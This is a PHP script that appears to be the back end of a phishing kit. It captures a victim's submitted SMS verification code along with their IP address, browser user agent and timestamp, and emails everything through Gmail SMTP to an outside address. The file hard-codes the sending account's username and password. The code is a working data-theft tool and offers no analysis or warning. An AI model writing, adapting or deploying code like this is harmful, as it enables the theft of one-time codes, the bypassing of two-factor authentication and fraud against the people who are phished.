<?php
date_default_timezone_set('GMT');
$TIME    = date("d-m-Y H:i:s");
$browser = getenv ("HTTP_USER_AGENT");
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 require 'PHPMailer-master/src/Exception.php';
 require 'PHPMailer-master/src/PHPMailer.php';
 require 'PHPMailer-master/src/SMTP.php';
function getUserIP() {

    $ipaddress = '';

    if (isset($_SERVER['HTTP_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_X_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];

    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_FORWARDED'];

    else if(isset($_SERVER['REMOTE_ADDR']))

        $ipaddress = $_SERVER['REMOTE_ADDR'];

    else

        $ipaddress = 'UNKNOWN';

    return $ipaddress;

}	

$ip= getUserIP();
 $message = "<br>--------------------+ [SMS ".$ip."] +--------------------<br>";
    $message .= "SMS              : ".$_POST['sms']."<br>";
    $message .= "~~~~~~~~~~~~~~~~~~~~<br>";
    $message .= "Time              : $TIME<br>";
    $message .= "IP : ".$ip."<br>";
    $message .= "Navigateur : ".$browser."<br>";
    $message .= "--------------------+ [SMS ".$ip."] +--------------------<br>";


  $mail = new PHPMailer();
  $mail->IsSMTP();

  $mail->SMTPDebug  = 0;  
  $mail->SMTPAuth   = TRUE;
  $mail->SMTPSecure = "tls";
  $mail->Port       = 587;
  $mail->Host       = "smtp.gmail.com";
  $mail->Username   = "erice8761@gmail.com";
  $mail->Password   = "googlechrome";

  $mail->IsHTML(true);
  $mail->AddAddress("chamonaaron@gmail.com", "chamonaaron");
  $mail->SetFrom("erice8761@gmail.com", "eric");

  $mail->Subject = "SMS | $ip ";
  $content = $message ;

  $mail->MsgHTML($content); 
  if(!$mail->Send()) {
    echo "Error while sending Email.";
    #var_dump($mail);
  } else {
    echo "Email sent successfully";
  }



?>